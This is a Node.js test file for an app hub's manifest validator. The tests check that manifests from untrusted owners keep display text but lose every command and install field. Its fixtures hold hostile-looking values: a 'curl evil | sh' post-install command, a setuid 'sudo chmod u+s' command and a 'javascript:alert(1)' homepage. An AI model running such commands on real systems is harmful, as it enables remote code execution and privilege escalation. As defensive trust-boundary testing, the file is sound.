"use strict";
// SPEC v0.12 "app manifest" — src/main/manifest.js and its discovery merge.
//
// The load-bearing claim of this whole section is a trust boundary: "show this
// sentence" and "offer to run this command as root" are not the same
// privilege. Most of what follows is that one sentence, tested.

const test = require("node:test");
const assert = require("node:assert");
const fs = require("fs");
const path = require("path");

const helpers = require("./helpers");
const config = require("../../src/main/config");
const github = require("../../src/main/github");
const discovery = require("../../src/main/discovery");
const manifest = require("../../src/main/manifest");

const SETTINGS = { owners: ["nerdrx", "Arikazei"], trustedManifestOwners: [] };

/** A manifest that asks for everything on both sides of the trust line. */
function greedyManifest(over = {}) {
  return Object.assign(
    {
      nxApp: 1,
      name: "Rogue Tool",
      tagline: "does a thing",
      homepage: "https://example.invalid/rogue",
      sandbox: "none",
      configPaths: ["~/.config/rogue"],
      keepAlive: true,
      artifacts: [
        {
          assetPattern: "*.AppImage",
          label: "Linux app",
          postInstallNote: "Then run the wizard once.",
          kind: "appimage",
          platform: "linux",
          packageId: "org.rogue",
          launchCmd: "~/.local/bin/rogue",
          postInstallCmd: "sudo chmod u+s /usr/bin/rogue",
          args: ["--kiosk"],
          prefix: "~/.local",
          stripPrefix: "usr/",
          addonsDir: "~/.config/blender/5.2/scripts/addons",
          binHint: "rogue",
        },
      ],
    },
    over
  );
}

/* ---------------------------------------------------------------- trust */

test("manifest: an untrusted owner keeps the words and loses every command", () => {
  const result = manifest.validate(greedyManifest(), { owner: "stranger", trusted: false });
  assert.strictEqual(result.ok, true, "the presentation half is still usable");

  const m = result.manifest;
  assert.strictEqual(m.name, "Rogue Tool");
  assert.strictEqual(m.tagline, "does a thing");
  assert.strictEqual(m.homepage, "https://example.invalid/rogue");
  assert.strictEqual(m.artifacts[0].label, "Linux app");
  assert.strictEqual(m.artifacts[0].postInstallNote, "Then run the wizard once.");

  for (const field of manifest.TRUSTED_FIELDS.concat(manifest.TRUSTED_STRUCTURAL)) {
    assert.ok(!(field in m), `app-level ${field} must not survive`);
    assert.ok(!(field in m.artifacts[0]), `artifacts[0].${field} must not survive`);
  }
  for (const field of ["postInstallCmd", "prefix", "addonsDir", "sandbox"]) {
    assert.ok(result.dropped.includes(field), `${field} is reported as dropped`);
  }
});

test("manifest: a trusted owner keeps them", () => {
  const result = manifest.validate(greedyManifest(), { owner: "nerdrx", trusted: true });
  assert.strictEqual(result.ok, true);
  assert.deepStrictEqual(result.dropped, []);
  const a = result.manifest.artifacts[0];
  assert.strictEqual(a.postInstallCmd, "sudo chmod u+s /usr/bin/rogue");
  assert.strictEqual(a.prefix, "~/.local");
  assert.strictEqual(a.addonsDir, "~/.config/blender/5.2/scripts/addons");
  assert.strictEqual(a.kind, "appimage");
  assert.deepStrictEqual(a.args, ["--kiosk"]);
  assert.strictEqual(result.manifest.sandbox, "none");
  assert.deepStrictEqual(result.manifest.configPaths, ["~/.config/rogue"]);
  assert.strictEqual(result.manifest.keepAlive, true);
});

test("manifest: trusted = settings.owners ∪ settings.trustedManifestOwners", () => {
  const s = { owners: ["nerdrx", "Arikazei"], trustedManifestOwners: ["A-Friend"] };
  assert.strictEqual(manifest.isTrustedOwner("nerdrx", s), true);
  assert.strictEqual(manifest.isTrustedOwner("ARIKAZEI", s), true, "case-insensitive");
  assert.strictEqual(manifest.isTrustedOwner("a-friend", s), true);
  assert.strictEqual(manifest.isTrustedOwner("stranger", s), false);
  assert.strictEqual(manifest.isTrustedOwner("", s), false);
  assert.strictEqual(manifest.isTrustedOwner("a-friend", { owners: ["nerdrx"] }), false, "default list is empty");
});

test("config: trustedManifestOwners defaults to [] and sanitises like owners", () => {
  assert.deepStrictEqual(config.defaults().trustedManifestOwners, []);
  const s = config.sanitize({ trustedManifestOwners: ["  friend ", "", 7, "friend", null] });
  assert.deepStrictEqual(s.trustedManifestOwners, ["friend"], "trimmed, de-duped, junk dropped");
  assert.deepStrictEqual(config.sanitize({ trustedManifestOwners: "friend" }).trustedManifestOwners, []);
});

/* ------------------------------------------------------- shape + caps */

test("manifest: malformed input is refused, never thrown", () => {
  for (const raw of [null, undefined, 42, "", "not json", "[1,2]", [], { name: 5 }]) {
    const r = manifest.validate(raw, { trusted: true });
    assert.strictEqual(r.ok, false, `${JSON.stringify(raw)} is not a manifest`);
    assert.strictEqual(r.manifest, null);
    assert.ok(r.problems.length, "and says why");
  }
  const cyclic = { name: "loop" };
  cyclic.self = cyclic;
  assert.strictEqual(manifest.validate(cyclic, { trusted: true }).ok, false, "a cyclic object does not throw");
});

test("manifest: over 32KB is refused outright", () => {
  const big = { name: "Big", tagline: "x".repeat(40 * 1024) };
  const r = manifest.validate(JSON.stringify(big), { trusted: true });
  assert.strictEqual(r.ok, false);
  assert.match(r.problems[0].detail, /too large/);
});

test("manifest: deep junk is dropped, not walked", () => {
  const junk = {
    name: "Deep",
    artifacts: [{ assetPattern: "*.zip", label: "z", nested: { a: { b: { c: [1, 2, 3] } } } }],
    hidden: ["everything"],
    apps: { "wivrn-nx": { name: "not yours" } },
  };
  const r = manifest.validate(junk, { trusted: true });
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.manifest.name, "Deep");
  assert.ok(!("apps" in r.manifest) && !("hidden" in r.manifest), "unknown top-level keys are gone");
  assert.ok(!("nested" in r.manifest.artifacts[0]), "unknown artifact keys are gone");
  assert.ok(r.problems.some((p) => p.field === "apps"), "and reported, so CI catches a typo");
});

test("manifest: caps clip rather than reject", () => {
  const r = manifest.validate(
    {
      name: "N".repeat(500),
      postInstallNote: "x".repeat(900),
      connector: { fields: Array.from({ length: 20 }, (_, i) => ({ key: `k${i}`, label: `L${i}` })) },
      artifacts: Array.from({ length: 20 }, (_, i) => ({ assetPattern: `a${i}.zip`, label: `A${i}` })),
    },
    { trusted: true }
  );
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.manifest.postInstallNote.length, 600, "note clipped to 600");
  assert.strictEqual(r.manifest.name.length, manifest.LIMITS.name);
  assert.strictEqual(r.manifest.artifacts.length, 16);
  assert.strictEqual(r.manifest.connector.fields.length, 16);
});

test("manifest: a file with nothing we recognise is not a manifest", () => {
  const overlayShaped = { hidden: ["petri"], apps: { "wivrn-nx": { name: "WiVRn NX" } } };
  assert.strictEqual(manifest.validate(overlayShaped, { trusted: true }).ok, false);
  // …and neither is one whose every field needed trust it does not have.
  const commandsOnly = { artifacts: [{ assetPattern: "*.zip", postInstallCmd: "curl evil | sh" }] };
  const r = manifest.validate(commandsOnly, { owner: "stranger", trusted: false });
  assert.strictEqual(r.ok, false);
  assert.ok(r.dropped.includes("postInstallCmd"), "the refusal is still reported");
});

test("manifest: junk values are reported per field and the rest survives", () => {
  const r = manifest.validate(
    {
      name: "Fine",
      homepage: "javascript:alert(1)",
      sandbox: "wide-open",
      artifacts: [{ assetPattern: "*.zip", label: "Zip", kind: "rootkit" }, { label: "no pattern" }, "nonsense"],
    },
    { trusted: true }
  );
  assert.strictEqual(r.ok, true);
  assert.ok(!("homepage" in r.manifest), "a non-http homepage is refused");
  assert.ok(!("sandbox" in r.manifest), "an unknown sandbox profile is refused");
  assert.strictEqual(r.manifest.artifacts.length, 1, "only the entry with a usable assetPattern");
  assert.ok(!("kind" in r.manifest.artifacts[0]), "an unknown install kind is refused");
});

/* ------------------------------------------------------------ sources */

function fakeGithub({ assetText = null, rawText = null, onRaw = () => {} } = {}) {
  const calls = { asset: 0, raw: 0 };
  return {
    calls,
    async fetchAssetText() {
      calls.asset += 1;
      if (assetText == null) throw new Error("no asset");
      return assetText;
    },
    async fetchRaw(...args) {
      calls.raw += 1;
      onRaw(...args);
      return rawText;
    },
  };
}

function releaseWithManifest(text) {
  return [
    helpers.release("v2.0", [
      { id: 1, name: "app-linux.AppImage", size: 10, url: "u1" },
      { id: 2, name: manifest.MANIFEST_FILE, size: Buffer.byteLength(text), url: "u2" },
    ]),
  ];
}

test("manifest: a release asset beats the repo root, and costs no raw fetch", async (t) => {
  const env = helpers.useTempEnv();
  t.after(() => env.cleanup());
  const assetText = JSON.stringify({ name: "From the asset" });
  const gh = fakeGithub({ assetText, rawText: JSON.stringify({ name: "From the repo root" }) });

  const entry = await manifest.loadForRepo({
    repo: helpers.repo("nerdrx", "demo"),
    releases: releaseWithManifest(assetText),
    github: gh,
    settings: SETTINGS,
    allowRepoFetch: true,
    log: () => {},
  });

  assert.strictEqual(entry.source, "asset");
  assert.strictEqual(entry.manifest.name, "From the asset");
  assert.strictEqual(gh.calls.raw, 0, "the repo root is not touched when an asset answered");
});

test("manifest: no asset → the repo root, cached by content", async (t) => {
  const env = helpers.useTempEnv();
  t.after(() => env.cleanup());
  const gh = fakeGithub({ rawText: JSON.stringify({ name: "From the repo root" }) });
  const args = { repo: helpers.repo("nerdrx", "demo"), releases: [], github: gh, settings: SETTINGS, allowRepoFetch: true, log: () => {} };

  const first = await manifest.loadForRepo(args);
  assert.strictEqual(first.source, "repo");
  assert.strictEqual(first.manifest.name, "From the repo root");
  assert.strictEqual(gh.calls.raw, 1);

  const second = await manifest.loadForRepo(args);
  assert.strictEqual(second.manifest.name, "From the repo root");
  assert.strictEqual(gh.calls.raw, 1, "the second pass is served from the cache");

  const cacheFile = path.join(config.cacheDir(), "manifests", "nerdrx_demo.json");
  assert.ok(fs.existsSync(cacheFile), "cached under cacheDir");
  assert.ok(config.readJson(cacheFile, {}).sha, "with the content sha");

  const forced = await manifest.loadForRepo(Object.assign({ force: true }, args));
  assert.strictEqual(gh.calls.raw, 2, "--force bypasses it");
  assert.ok(forced);
});

test("manifest: a repo with no nx-app.json is remembered as having none", async (t) => {
  const env = helpers.useTempEnv();
  t.after(() => env.cleanup());
  const gh = fakeGithub({ rawText: null });
  const args = { repo: helpers.repo("nerdrx", "demo"), releases: [], github: gh, settings: SETTINGS, allowRepoFetch: true, log: () => {} };
  assert.strictEqual(await manifest.loadForRepo(args), null);
  assert.strictEqual(await manifest.loadForRepo(args), null);
  assert.strictEqual(gh.calls.raw, 1, "the negative answer is cached too");
});

test("manifest: allowRepoFetch=false never reaches for the repo root", async (t) => {
  const env = helpers.useTempEnv();
  t.after(() => env.cleanup());
  const gh = fakeGithub({ rawText: JSON.stringify({ name: "Nope" }) });
  const entry = await manifest.loadForRepo({
    repo: helpers.repo("nerdrx", "demo"),
    releases: [],
    github: gh,
    settings: SETTINGS,
    allowRepoFetch: false,
    log: () => {},
  });
  assert.strictEqual(entry, null);
  assert.strictEqual(gh.calls.raw, 0);
});

test("manifest: a malformed manifest is one log line and nothing else", async (t) => {
  const env = helpers.useTempEnv();
  t.after(() => env.cleanup());
  const lines = [];
  const gh = fakeGithub({ rawText: "{ this is not json" });
  const entry = await manifest.loadForRepo({
    repo: helpers.repo("nerdrx", "demo"),
    releases: [],
    github: gh,
    settings: SETTINGS,
    allowRepoFetch: true,
    log: (m) => lines.push(m),
  });
  assert.strictEqual(entry, null);
  assert.strictEqual(lines.length, 1);
  assert.match(lines[0], /ignored/);
});

test("manifest: an untrusted owner's dropped fields are ONE log line naming them", async (t) => {
  const env = helpers.useTempEnv();
  t.after(() => env.cleanup());
  const lines = [];
  const text = JSON.stringify(greedyManifest());
  const entry = await manifest.loadForRepo({
    repo: helpers.repo("stranger", "rogue"),
    releases: releaseWithManifest(text),
    github: fakeGithub({ assetText: text }),
    settings: SETTINGS,
    allowRepoFetch: false,
    log: (m) => lines.push(m),
  });
  assert.strictEqual(entry.trusted, false);
  assert.strictEqual(lines.length, 1);
  assert.match(lines[0], /not a trusted manifest owner/);
  assert.match(lines[0], /postInstallCmd/);
});

test("manifest: an oversized asset is not even downloaded", async (t) => {
  const env = helpers.useTempEnv();
  t.after(() => env.cleanup());
  const gh = fakeGithub({ assetText: "{}" });
  const release = helpers.release("v1", [{ id: 9, name: manifest.MANIFEST_FILE, size: 900 * 1024, url: "u" }]);
  const entry = await manifest.loadForRepo({
    repo: helpers.repo("nerdrx", "demo"),
    releases: [release],
    github: gh,
    settings: SETTINGS,
    log: () => {},
  });
  assert.strictEqual(entry, null);
  assert.strictEqual(gh.calls.asset, 0);
});

/* --------------------------------------------------- discovery merge */

const OVERLAY = {
  hidden: [],
  apps: {
    curated: { name: "Curated Name", order: 3 },
  },
};

async function entryFor(repo, raw, { allowRepoFetch = true, settings = SETTINGS } = {}) {
  return manifest.loadForRepo({
    repo,
    releases: [],
    github: fakeGithub({ rawText: typeof raw === "string" ? raw : JSON.stringify(raw) }),
    settings,
    allowRepoFetch,
    log: () => {},
    ttlMs: 0, // every call in these tests is a fresh answer
  });
}

function buildWith(repo, release, entry, overlay = OVERLAY) {
  const key = repo.full_name.toLowerCase();
  return discovery.buildApps({
    repos: [repo],
    releases: { [key]: release },
    overlay,
    installedState: { installed: {} },
    adb: { available: false, devices: [], apkVersions: {} },
    primaryOwner: "nerdrx",
    settings: config.sanitize(SETTINGS),
    manifests: entry ? { [key]: entry } : {},
  })[0];
}

test("discovery: the overlay wins PER FIELD — a name override keeps the manifest's note", async (t) => {
  const env = helpers.useTempEnv();
  t.after(() => env.cleanup());
  const repo = helpers.repo("nerdrx", "curated", { description: "repo description" });
  const entry = await entryFor(repo, {
    name: "Manifest Name",
    tagline: "Manifest tagline",
    artifacts: [{ assetPattern: "*.AppImage", label: "Manifest label", postInstallNote: "Log out and back in." }],
  });
  const release = helpers.release("v1.0.0", [{ id: 1, name: "curated-1.0.0.AppImage", size: 10, url: "u" }]);
  const app = buildWith(repo, release, entry);

  assert.strictEqual(app.name, "Curated Name", "the overlay's name wins");
  assert.strictEqual(app.tagline, "Manifest tagline", "…and does not discard the manifest's tagline");
  assert.strictEqual(app.artifacts[0].label, "Manifest label");
  assert.strictEqual(app.artifacts[0].postInstallNote, "Log out and back in.");
  assert.strictEqual(app.artifacts[0].postInstallNoteFrom, "manifest");
  assert.deepStrictEqual(app.manifest, { present: true, source: "repo", trusted: true });
});

test("discovery: an overlay note beats the manifest's, and says so", async (t) => {
  const env = helpers.useTempEnv();
  t.after(() => env.cleanup());
  const repo = helpers.repo("nerdrx", "curated");
  const entry = await entryFor(repo, {
    artifacts: [{ assetPattern: "*.AppImage", postInstallNote: "The app's own sentence." }],
  });
  const overlay = {
    hidden: [],
    apps: { curated: { name: "Curated Name", artifacts: [{ assetPattern: "*.AppImage", postInstallNote: "The hub's sentence." }] } },
  };
  const release = helpers.release("v1.0.0", [{ id: 1, name: "curated-1.0.0.AppImage", size: 10, url: "u" }]);
  const app = buildWith(repo, release, entry, overlay);
  assert.strictEqual(app.artifacts[0].postInstallNote, "The hub's sentence.");
  assert.strictEqual(app.artifacts[0].postInstallNoteFrom, "overlay");
});

test("discovery: an app without a manifest reports null, and its notes carry no source", () => {
  const repo = helpers.repo("nerdrx", "plain");
  const release = helpers.release("v1.0.0", [{ id: 1, name: "plain-1.0.0.AppImage", size: 10, url: "u" }]);
  const app = buildWith(repo, release, null);
  assert.strictEqual(app.manifest, null);
  assert.strictEqual(app.artifacts[0].postInstallNote, null);
  assert.strictEqual(app.artifacts[0].postInstallNoteFrom, null);
});

test("discovery: an untrusted repo's manifest never reaches the Run button", async (t) => {
  const env = helpers.useTempEnv();
  t.after(() => env.cleanup());
  const repo = helpers.repo("stranger", "rogue", { description: "third party" });
  const entry = await entryFor(repo, greedyManifest());
  const release = helpers.release("v2.0", [{ id: 1, name: "rogue-2.0.AppImage", size: 10, url: "u" }]);
  const app = buildWith(repo, release, entry, { hidden: [], apps: {} });

  assert.strictEqual(app.manifest.trusted, false);
  assert.strictEqual(app.name, "Rogue Tool", "the words are allowed");
  assert.strictEqual(app.artifacts[0].label, "Linux app");
  assert.strictEqual(app.artifacts[0].postInstallNote, "Then run the wizard once.");
  assert.strictEqual(app.artifacts[0].postInstallNoteFrom, "manifest");

  // …and nothing that executes or places bytes.
  const a = app.artifacts[0];
  for (const field of ["postInstallCmd", "launchCmd", "args", "prefix", "stripPrefix", "addonsDir", "binHint", "packageId", "sandbox", "configPaths"]) {
    assert.strictEqual(a[field], undefined, `artifact.${field} must be absent`);
  }
  assert.strictEqual(app.sandbox, undefined, "no app-level sandbox profile either");
  assert.strictEqual(app.configPaths, undefined);
  assert.strictEqual(a.kind, "appimage", "the classifier's own verdict, not the manifest's");
});

test("discovery: a trusted owner's manifest does reach it", async (t) => {
  const env = helpers.useTempEnv();
  t.after(() => env.cleanup());
  const repo = helpers.repo("nerdrx", "ours");
  const entry = await entryFor(repo, greedyManifest({ name: "Ours" }));
  const release = helpers.release("v2.0", [{ id: 1, name: "ours-2.0.AppImage", size: 10, url: "u" }]);
  const app = buildWith(repo, release, entry, { hidden: [], apps: {} });

  assert.strictEqual(app.manifest.trusted, true);
  const a = app.artifacts[0];
  assert.strictEqual(a.postInstallCmd, "sudo chmod u+s /usr/bin/rogue");
  assert.strictEqual(a.launchCmd, "~/.local/bin/rogue");
  assert.strictEqual(a.prefix, "~/.local");
  assert.strictEqual(a.addonsDir, "~/.config/blender/5.2/scripts/addons");
  assert.strictEqual(app.sandbox, "none");
  assert.deepStrictEqual(app.configPaths, ["~/.config/rogue"]);
});

test("discovery: the nx-app.json asset is never an installable row", async (t) => {
  const env = helpers.useTempEnv();
  t.after(() => env.cleanup());
  assert.strictEqual(discovery.classifyAsset({ name: "nx-app.json" }), null);
  assert.strictEqual(discovery.classifyAsset({ name: "NX-App.JSON" }), null, "case-insensitively");

  const text = JSON.stringify({ name: "Self Described", artifacts: [{ assetPattern: "*.AppImage", label: "Linux app" }] });
  const repo = helpers.repo("nerdrx", "selfy");
  const release = helpers.release("v1.0.0", [
    { id: 1, name: "selfy-1.0.0.AppImage", size: 10, url: "u1" },
    { id: 2, name: manifest.MANIFEST_FILE, size: Buffer.byteLength(text), url: "u2" },
  ]);
  const entry = await manifest.loadForRepo({
    repo,
    releases: [release],
    github: fakeGithub({ assetText: text }),
    settings: SETTINGS,
    log: () => {},
  });
  const app = buildWith(repo, release, entry, { hidden: [], apps: {} });
  assert.strictEqual(app.manifest.source, "asset");
  assert.deepStrictEqual(
    app.artifacts.map((a) => a.assetName),
    ["selfy-1.0.0.AppImage"],
    "the manifest asset is not one of the artifacts"
  );
});

/* ----------------------------------------------- the pass-level gate */

test("refresh(): an anonymous hub never fetches a repo-root manifest", async (t) => {
  const env = helpers.useTempEnv();
  const mock = await helpers.startMockGitHub({});
  t.after(async () => {
    await mock.close();
    env.cleanup();
  });
  config.save({ owners: ["nerdrx"], extraRepos: [] });
  discovery.init({
    github: github.createClient({ baseUrl: mock.base, rawBaseUrl: `${mock.base}/raw`, cacheDir: path.join(env.dataDir, "cache"), getToken: async () => null }),
    emit: () => {},
  });

  const apps = await discovery.refresh({ force: true });
  assert.ok(apps.length, "discovery still worked");
  assert.ok(
    !mock.stats.requests.some((r) => r.endsWith(`/${manifest.MANIFEST_FILE}`)),
    "not one nx-app.json request went out"
  );
  assert.ok(apps.every((a) => a.manifest === null), "and every app reports no manifest");
});

test("refresh(): a signed-in hub does look, and a tight rate limit stops it again", async (t) => {
  const env = helpers.useTempEnv();
  const mock = await helpers.startMockGitHub({ token: "test-token" });
  t.after(async () => {
    await mock.close();
    env.cleanup();
  });
  config.save({ owners: ["nerdrx"], extraRepos: [], token: "test-token" });
  discovery.init({
    github: github.createClient({
      baseUrl: mock.base,
      rawBaseUrl: `${mock.base}/raw`,
      cacheDir: path.join(env.dataDir, "cache"),
      getToken: async () => "test-token",
    }),
    emit: () => {},
  });

  await discovery.refresh({ force: true });
  const looked = mock.stats.requests.filter((r) => r.endsWith(`/${manifest.MANIFEST_FILE}`)).length;
  assert.ok(looked > 0, "the repo root is consulted when we have a token");

  // Now pretend the last pass came back throttled: the per-repo fetch is the
  // first thing to go.
  discovery._setCached({ rateLimit: { resetAt: Date.now() + 60000, message: "throttled" } });
  const before = mock.stats.requests.length;
  await discovery.refresh({ force: true });
  const after = mock.stats.requests.slice(before);
  assert.ok(!after.some((r) => r.endsWith(`/${manifest.MANIFEST_FILE}`)), "no manifest lookups while throttled");
});

/* ------------------------------------------------- fromOverlayEntry */

test("manifest: fromOverlayEntry reproduces what the hub already curates", () => {
  const generated = manifest.fromOverlayEntry("wivrn-nx");
  assert.strictEqual(generated.nxApp, 1);
  assert.strictEqual(generated.name, "WiVRn NX");
  const server = generated.artifacts.find((a) => a.kind === "tarball-prefix");
  assert.match(server.postInstallNote, /setcap cap_sys_nice\+ep/, "the setcap note travels with the app now");
  assert.strictEqual(server.postInstallCmd, "sudo setcap cap_sys_nice+ep ~/.local/bin/wivrn-server");
  assert.strictEqual(server.prefix, "~/.local");
  assert.ok(!("order" in generated), "ranking stays central — a repo does not rank itself");

  const round = manifest.validate(generated, { owner: "nerdrx", trusted: true });
  assert.strictEqual(round.ok, true, "what we print is what we accept");
  assert.deepStrictEqual(round.problems, []);

  assert.strictEqual(manifest.fromOverlayEntry("no-such-app"), null);
  assert.ok(manifest.overlayIds().includes("wivrn-nx"));
});

test("manifest: fromOverlayEntry survives an overlay entry with no artifacts", () => {
  const overlay = { apps: { solo: { name: "Solo", connector: { fields: { hr: "Heart rate" } } } } };
  const generated = manifest.fromOverlayEntry("solo", { overlay });
  assert.strictEqual(generated.name, "Solo");
  assert.deepStrictEqual(generated.connector.fields, [{ key: "hr", label: "Heart rate", unit: "", kind: "text" }]);
  assert.strictEqual(manifest.validate(generated, { trusted: false }).ok, true);
});
